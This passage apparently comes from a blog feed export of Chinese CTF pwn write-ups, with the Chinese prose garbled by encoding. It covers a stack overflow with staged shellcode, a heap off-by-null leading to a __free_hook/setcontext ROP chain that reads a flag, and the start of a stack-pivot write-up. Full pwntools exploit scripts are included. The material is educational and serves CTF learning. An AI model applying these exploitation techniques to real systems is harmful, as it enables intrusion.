<p>bufè¿™é‡Œå¯ä»¥å†™å…¥30ä¸ªå­—èŠ‚çš„å†…å®¹ï¼Œæ‰€ä»¥å¯ä»¥è¦†ç›–åˆ°è¿”å›åœ°å€ï¼Œä½†æ˜¯å…·ä½“çš„é•¿åº¦è¦åŠ¨æ€å»çœ‹ã€‚æˆ‘è¿™è¾¹æ˜¯è¿›å…¥åˆ°äº†adminåŠŸèƒ½ä¸­ï¼Œå¯ä»¥çœ‹è§ï¼Œå‰äº”ä¸ªå­—èŠ‚æ˜¯ç”¨æ¥å¯¹é½æ ˆå†…å®¹ï¼Œæ¥ä¸‹æ¥çš„å…«ä¸ªå­—èŠ‚å°±å¯ä»¥è¦†ç›–rbpå†…å®¹ï¼Œè¿™è¾¹è¦†ç›–çš„æ˜¯adminä¸­è¾“å…¥å‡½æ•°çš„rbp</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913171057369.png" alt="image-20210913171057369"></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221356910.png" alt="image-20210913221356910"></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913221754144.png" alt="image-20210913221754144"></p>
<p>å¹¶ä¸”å‘¢ï¼Œ.bssæ˜¯å±äºå¯æ‰§è¡Œæ®µçš„ï¼Œå…ˆè¦†ç›–è¿”å›åœ°å€å»æ‰§è¡Œreadå‡½æ•°ï¼Œå› ä¸ºreadæ˜¯æœ‰ä¸‰ä¸ªå‚æ•°çš„ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥è§‚å¯Ÿå½“æ‰§è¡Œreadå‡½æ•°æ—¶ï¼Œä¸‰ä¸ªå‚æ•°éƒ½æ˜¯å·²ç»æ»¡è¶³äº†çš„ï¼ˆå› ä¸ºæˆ‘ä»¬åˆšå¼€å§‹å°±å€Ÿç€readå‡½æ•°çš„æº¢å‡ºï¼Œå¹¶ä¸”å¯„å­˜å™¨å¹¶æœªè¢«æ”¹å˜ï¼‰ã€‚æ‰€ä»¥å†™å…¥æ•°æ®çš„åœ°æ–¹æ˜¯æ ˆä¸Šä¸€ä¸ªåœ°å€ï¼Œæ‰€ä»¥å…ˆæ„é€ ä¸€æ¬¡shellcodeï¼ˆæ³¨æ„shellcodeå¤§å°ï¼Œå› ä¸ºé•¿åº¦æœ€å¤šä¸º0x1dï¼‰ç³»ç»Ÿè°ƒç”¨readå‡½æ•°ï¼Œå¾€.bssä¸Šå†™ç¬¬äºŒä¸ªshellcodeï¼Œè¿™æ¬¡shellcodeçš„é•¿åº¦ä¸€å®šè¦å¤Ÿå¤§ï¼Œä¸ç„¶å†™ä¸ä¸‹ã€‚æœ€åå°±æ˜¯åœ¨.bssä¸Šå†™æœ€ç»ˆçš„orwï¼Œè¯»å–flagå³å¯</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210913211252996.png" alt="image-20210913211252996"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>context.binary = elf<br>p = process(<span class="hljs-string">&quot;./nologin&quot;</span>)<br>call_rsi = <span class="hljs-number">0x000000000040186b</span><br>read = elf.plt[<span class="hljs-string">&#x27;read&#x27;</span>]<br><br>gdb.attach(p,<span class="hljs-string">&quot;b *0x0000000000401007&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;input&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;&gt;password: &quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x602030</span>+<span class="hljs-number">0x28</span>)+ p64(read) + p64(call_rsi)<br>p.sendline(payload)<br>shellcode=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">              xor rax, rax;</span><br><span class="hljs-string">              push r11;</span><br><span class="hljs-string">              pop rdx;</span><br><span class="hljs-string">              mov rsi, 0x602100;</span><br><span class="hljs-string">              syscall;</span><br><span class="hljs-string">              add rsi, 28;</span><br><span class="hljs-string">              jmp rsi;</span><br><span class="hljs-string">              &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode))<br>p.sendline(shellcode)<br>shellcode1=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rax, 2;</span><br><span class="hljs-string">               sub rsi, 16;</span><br><span class="hljs-string">               mov rdi, rsi;</span><br><span class="hljs-string">               xor rsi, rsi;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string"></span><br><span class="hljs-string">               mov rdi, rax;</span><br><span class="hljs-string">               xor rax, rax;</span><br><span class="hljs-string">               mov rsi, 0x602300;</span><br><span class="hljs-string">               mov rdx, 0x80;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               </span><br><span class="hljs-string">               mov rax, 1;</span><br><span class="hljs-string">               mov rdi, 1;</span><br><span class="hljs-string">               syscall;</span><br><span class="hljs-string">               &#x27;&#x27;&#x27;</span>)<br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(shellcode1))<br>p.sendline(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">11</span> + <span class="hljs-string">&#x27;./flag\x00\x00&#x27;</span>*<span class="hljs-number">3</span> + shellcode1)<br>p.interactive() <br></code></pre></td></tr></table></figure>

<h2 id="Whats-your-name"><a href="#Whats-your-name" class="headerlink" title="Whats your name"></a>Whats your name</h2><p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204918588.png" alt="image-20210923204918588"></p>
<p>å¸¸è§„checksecï¼Œ64ä½ä¿æŠ¤å…¨å¼€</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083229104.png" alt="image-20210924083229104"></p>
<p>addé‡Œé¢ï¼Œä¼šå…ˆç”³è¯·ä¸€å—0x10å¤§å°çš„å †å—ï¼Œç„¶ååœ¨å‰å…«å­—èŠ‚ä½œä¸ºå‡½æ•°æŒ‡é’ˆå­˜æ”¾putsåœ°å€ï¼Œåå…«å­—èŠ‚å­˜æ”¾ä¸€ä¸ªå¤§å°åœ¨0~0x100ä¹‹é—´çš„å †å—åœ°å€ï¼Œæœ€å¤šèƒ½ç”³è¯·å‡º10ä¸ªå †å—<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083439735.png" alt="image-20210924083439735"></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083201516.png" alt="image-20210924083201516"></p>
<p>åœ¨edité‡Œé¢ï¼Œå†™å…¥å‡½æ•°ä¼šå †æº¢å‡ºä¸€ä¸ª0ï¼Œæ¼æ´ç‚¹offbynull</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083514708.png" alt="image-20210924083514708"></p>
<p>showé‡Œé¢ï¼Œè°ƒç”¨ä¹‹å‰å­˜æ”¾çš„å‡½æ•°æŒ‡é’ˆï¼Œæ‰“å°å †å—å†…å®¹</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083618714.png" alt="image-20210924083618714"></p>
<p>é‡Šæ”¾å †å—ï¼Œå…¨éƒ¨ç½®0</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924083715443.png" alt="image-20210924083715443"></p>
<p>æœ€åï¼Œç¨‹åºå¼€äº†æ²™ç®±ï¼Œçœ‹æ¥æ˜¯è¦orwäº†</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210923204552633.png" alt="image-20210923204552633"></p>
<p>è¿™æ˜¯ä»€ä¹ˆéƒ½æ²¡åšçš„æƒ…å†µï¼Œç”±äºå¼€å¯æ²™ç®±éƒ½æ˜¯ä¼šè¿™æ ·çš„å‡ºç°å¾ˆå¤šçš„å †å—ï¼Œé‡Œé¢æœ‰ä¸€å—æ˜¯unsorted chunkï¼Œç»™ä»–ç”³è¯·å›æ¥ï¼Œé‡Œé¢å°±å·²ç»å­˜æ”¾ç€è„æ•°æ®äº†ï¼Œç›´æ¥å°±èƒ½æ³„éœ²libcã€‚åŒæ ·ä¹Ÿèƒ½æ³„éœ²å‡ºå †ä¸Šåœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924092730279.png" alt="image-20210924092730279"></p>
<p>æˆ‘ä»¬è¦åˆ©ç”¨offbynullï¼Œè‚¯å®šæ˜¯è¦åˆ¶é€ å‡ºå †å—é‡å çš„ï¼Œé‚£ä¹ˆå°±ä¸€å®šè¦è®©å †å—æ˜¯è¿ç»­çš„ï¼Œæ‰€ä»¥ä¸èƒ½æ˜¯ä¸Šé¢biné“¾å­˜åœ¨çš„å¤§å°ï¼Œå¹¶ä¸”offbynullï¼Œé‚£æº¢å‡ºè¢«è¦†ç›–ä¸º0çš„è‚¯å®šæ˜¯0xf0çš„å †å—<img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093026970.png" alt="image-20210924093026970"></p>
<p>è¿™æ˜¯è¿ç»­ç”³è¯·å‡ºæ¥çš„å››ä¸ªå †å—ï¼Œå…¨éƒ½è¿åœ¨äº†ä¸€èµ·ï¼Œæ‰æ–¹ä¾¿æˆ‘ä»¬åç»­åˆ¶é€ å †å—é‡å </p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924093202818.png" alt="image-20210924093202818"></p>
<p>é€šè¿‡offbynullï¼ŒæˆåŠŸå°†in_useä½ç½®ä¸º0</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924094657672.png" alt="image-20210924094657672"></p>
<p>ç„¶åé‡Šæ”¾å †å—ï¼Œè§¦å‘åˆå¹¶</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924195657525.png" alt="image-20210924195657525"></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200058670.png" alt="image-20210924200058670"></p>
<p>ç„¶åå†æŠŠ0xf0å †å—ç”³è¯·å›æ¥ï¼Œæ¥ç€æˆ‘ä»¬ç”³è¯·åœ¨binæœ‰çš„å †å—ï¼Œå› ä¸ºå†åˆ†é…å°±æ˜¯è¦é‡å åœ¨ä¹‹å‰æœªè¢«é‡Šæ”¾çš„0x40çš„å †å—ä¸Šäº†ï¼Œè€Œæˆ‘ä»¬è¦å’Œè¿™ä¸ªå †å—é‡å çš„è¦é€‰æ‹©é‚£ä¸ªç¨‹åºå¸®æˆ‘ä»¬ç”³è¯·çš„å †å—ï¼Œå› ä¸ºæ§åˆ¶è¿™ä¸ªå †å—æ˜¯å¯ä»¥å€Ÿç€editåŠŸèƒ½æ‰§è¡Œä»»æ„åœ°å€å†™çš„ï¼Œæˆ–è€…åœ¨showåŠŸèƒ½é‡Œé¢è·å¾—æ‰§è¡Œæƒé™ï¼Œå¯è°“å¥½å¤„å¤šå¤š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br></code></pre></td></tr></table></figure>

<p>åˆ°ç°åœ¨ï¼Œæ‰€æœ‰çš„é“ºå«éƒ½å·²ç»å‡†å¤‡å¥½äº†ï¼Œæ¥ç€å…ˆè®¡ç®—ä¸€ä¸‹æˆ‘ä»¬éœ€è¦çš„gadgetï¼Œä»¥åŠropçš„åœ°å€è®¡ç®—ï¼Œä»¥åŠflagåœ°å€çš„æ’å¸ƒ</p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924200749914.png" alt="image-20210924200749914"></p>
<p>æŠŠflagå­—ç¬¦ä¸²å†™åˆ°å‰é¢æˆ‘ä»¬ç”³è¯·çš„1å †å—ä¸Šï¼Œå¯ä»¥ç›´æ¥ç”¨æœç´¢åŠŸèƒ½ï¼Œæ›´å¿«ç‚¹ï¼Œropçš„åœ°å€è¦åé¢ç”³è¯·å‡ºå†™çš„å †å—å†å›æ¥ç®—çš„</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924202223468.png" alt="image-20210924202223468"></p>
<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924211125389.png" alt="image-20210924211125389"></p>
<p>å€Ÿç€å‰é¢çš„å †å—é‡å ï¼Œå¾€free_hooké‡Œé¢å†™setcontext+53å°±è¡Œï¼Œç„¶åå°±æ˜¯æœ€åçš„å †ä¸Šå¸ƒç½®ropé“¾ï¼Œå †å—ç»™çš„å¤Ÿå¤§ï¼Œé‚£å°±ç›´æ¥é€‰æ‹©æœ€å¤§çš„å †å—è¿›è¡Œå¸ƒç½®ï¼Œå› ä¸ºè¦å…ˆç”³è¯·ä¸€ä¸ª0x20çš„å †å—ï¼Œå‰©ä¸‹çš„å¤§å°ä¸å¤Ÿ0x100ï¼Œæ‰€ä»¥å †å—çš„ä½ç½®æ˜¯åœ¨æœ€ä¸‹æ–¹çš„ï¼Œç„¶ååœ¨ä¸Šé¢å¸ƒç½®å¥½ropï¼Œæœ€åå°±æ˜¯åœ¨setcontextçš„gadgetæŒ‡å‘çš„ç›¸åº”ä½ç½®å†™å¥½ï¼Œè·³è½¬æ‰§è¡Œå°±è¡Œ</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/2021/09/13/2021-09-13-2021%E7%BE%8A%E5%9F%8E%E6%9D%AFPWN/image-20210924220626687.png" alt="image-20210924220626687"></p>
<p>æˆåŠŸè¯»å–flagï¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./name&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;&quot;,)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;name size:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(size))<br>	<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br>	p.recvuntil(<span class="hljs-string">&quot;name:\n&quot;</span>)<br>	p.send(content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;5.exit\n&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;index:\n&quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0xe8</span>) <span class="hljs-comment">#0</span><br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">3951480</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>add(<span class="hljs-number">0x70</span>) <span class="hljs-comment">#1</span><br>show(<span class="hljs-number">1</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.info(<span class="hljs-string">&#x27;heap_addr==&gt;0x%x&#x27;</span> %heap_addr)<br><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x38</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x30</span>) <span class="hljs-comment">#5</span><br>free(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x140</span>))<br>free(<span class="hljs-number">4</span>)<br>add(<span class="hljs-number">0xf0</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x60</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">0x20</span>) <span class="hljs-comment">#6</span><br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&quot;setcontext&quot;</span>] + <span class="hljs-number">53</span><br><span class="hljs-built_in">open</span> = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>ret = <span class="hljs-number">0x0000000000000937</span> + libc_base<br>pop_rdi = <span class="hljs-number">0x0000000000021112</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x00000000000202f8</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b92</span> + libc_base<br>rop_addr = heap_addr + <span class="hljs-number">0x820</span><br>flag_addr = heap_addr - <span class="hljs-number">0x190</span><br><br>edit(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;./flag\x00&#x27;</span>)<br>edit(<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + p64(free_hook))<br>edit(<span class="hljs-number">6</span>, p64(setcontext))<br>add(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#7</span><br>payload = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-built_in">open</span>)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(read)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(rop_addr + <span class="hljs-number">0x500</span>) + p64(pop_rdx) + p64(<span class="hljs-number">0x40</span>) + p64(write)<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(payload)))<br>edit(<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">8</span> + payload)<br>frame = SigreturnFrame()<br>frame.rsp = rop_addr + <span class="hljs-number">8</span><br>frame.rip = ret<br>success(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">len</span>(frame)))<br>edit(<span class="hljs-number">0</span>, <span class="hljs-built_in">str</span>(frame))<br>free(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>ç¾ŠåŸæ¯</tag>
      </tags>
  </entry>
  <entry>
    <title>buu08</title>
    <url>/2021/09/05/2021-09-05-buu08/</url>
    <content><![CDATA[<h2 id="ä¸€ã€pwnable-simple-login"><a href="#ä¸€ã€pwnable-simple-login" class="headerlink" title="ä¸€ã€pwnable_simple_login"></a>ä¸€ã€pwnable_simple_login</h2><p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105207938.png" alt="image-20210910105207938"></p>
<p>å¸¸è§„checksecï¼Œå¼€äº†NXã€Canaryã€‚ä½†æ˜¯åˆ°IDAé‡Œé¢å‘ç°ï¼Œæ²¡çœ‹åˆ°Canaryçš„è¸ªè¿¹</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105257032.png" alt="image-20210910105257032"></p>
<p>IDAé‡Œé¢æœ‰åé—¨å‡½æ•°</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105318680.png" alt="image-20210910105318680"></p>
<p>base64è§£ç å‡½æ•°é‡Œé¢æœ‰äº›å¤æ‚ï¼Œçœ‹çš„å¾ˆéš¾å—ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºé€»è¾‘è¿›è¡Œåˆ¤æ–­ï¼Œè¿”å›çš„åº”è¯¥æ˜¯é•¿åº¦ï¼Œå› ä¸ºåº•ä¸‹è¿›è¡Œäº†æ¯”å¤§å°ï¼›è€Œsæ˜¯æˆ‘ä»¬è¾“å…¥çš„å€¼æ²¡ä»€ä¹ˆå¥½è¯´ï¼Œå°±æ˜¯è¦è¾“å…¥ä¸€ä¸ªbase64çš„å€¼è®©ä»–å†è§£ç æˆæ­£å¸¸å€¼ï¼›v5åˆ™åº”è¯¥æ˜¯è§£ç åçš„å€¼ï¼Œå› ä¸ºåº•ä¸‹æŠŠv5çš„å€¼å†™å…¥äº†inputé‡Œé¢ã€‚ä½†æ˜¯å¦‚æœæ˜¯è¦ä»¥ç¨‹åºé€»è¾‘æ‰§è¡Œåˆ°åé—¨å‡½æ•°çš„è¯ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“è¡Œä¸è¡Œï¼Œåæ­£æˆ‘æ˜¯ä¸ä¼šçš„ã€‚æƒ³çš„è‚¯å®šæ˜¯æœ‰æ²¡æœ‰å“ªé‡Œæœ‰æº¢å‡ºï¼Œè·³åˆ°åé—¨å‡½æ•°å°±è¡Œäº†ã€‚</p>
<p><img src="/2021/09/05/2021-09-05-buu08/image-20210910105421986.png" alt="image-20210910105421986"></p>
<p>æ‰¾äº†æ‰¾ï¼Œåœ¨authå‡½æ•°é‡Œé¢ï¼Œmemcpyå¯ä»¥æº¢å‡ºäº†ï¼Œå› ä¸ºsizeæœ€å¤§å¯ä»¥ä¸º12ï¼Œè€Œv4è·ç¦»è¿”å›å€¼åç§»ä¹Ÿä¸º12ï¼Œä¼¼ä¹ä¸å¤Ÿï¼Œåªèƒ½è¦†ç›–åˆ°ebpï¼Œä¸è¿‡å¯ä»¥å‘ç°ï¼Œåœ¨è¿™ä¸ªå‡½æ•°é‡Œé¢æ‰§è¡Œä¸€æ¬¡leave retï¼Œç„¶åè¿™ä¸ªå‡½æ•°é€€å‡ºäº†ï¼Œåˆ°mainå‡½æ•°ï¼Œåˆšå¥½åˆå°†ä¼šç»§ç»­æ‰§è¡Œleave retã€‚æ‰€ä»¥å…¶å®å°±æ˜¯ä¸€ç§æ ˆè¿ç§»ï¼ŒæŠŠæ ˆè¿ç§»åˆ°.bssä¸Šå»ï¼Œç„¶åæ‰§è¡Œåé—¨å‡½æ•°</p>
